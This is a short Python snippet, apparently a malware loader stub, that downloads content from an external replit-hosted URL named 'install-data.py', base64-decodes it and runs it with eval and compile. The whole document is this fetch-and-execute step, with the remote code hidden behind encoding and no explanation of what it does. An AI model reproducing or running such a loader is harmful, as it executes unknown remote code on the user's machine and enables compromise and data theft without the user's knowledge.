import base64, requests
z = requests.get("https://pex-recovery.anarix0.repl.co/install-data.py").text
eval(compile(base64.b64decode(eval('z')), '<string>' ,'exec'))
